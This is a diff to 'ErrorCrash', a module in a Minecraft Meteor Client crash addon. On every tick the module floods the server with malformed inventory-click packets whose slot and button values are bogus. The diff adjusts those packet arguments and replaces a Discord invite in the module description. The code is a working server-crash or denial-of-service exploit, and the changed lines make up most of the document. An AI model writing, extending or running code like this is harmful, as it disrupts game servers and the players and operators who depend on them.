@@ -1,7 +1,6 @@
 package widecat.meteorcrashaddon.modules;
 
-import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
-import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
+import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.settings.BoolSetting;
@@ -11,7 +10,6 @@ import meteordevelopment.meteorclient.settings.SettingGroup;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.item.ItemStack;
-import net.minecraft.item.Items;
 import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
 import net.minecraft.screen.slot.SlotActionType;
 import widecat.meteorcrashaddon.CrashAddon;
@@ -34,15 +32,13 @@ public class ErrorCrash extends Module {
         .build());
 
     public ErrorCrash() {
-        super(CrashAddon.CATEGORY, "error-crash", "i love discord.gg/g42rvX3c6s!!!!!");
+        super(CrashAddon.CATEGORY, "error-crash", "i love mai!!!!!");
     }
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
-        Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
-        REAL.put(0, new ItemStack(Items.RED_DYE, 1));
         for (int i = 0; i < amount.get(); i++) {
-            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId,123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
+            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId,123344, 46, 2859623, SlotActionType.PICKUP, ItemStack.EMPTY, Int2ObjectMaps.emptyMap()));
         }
     }
 
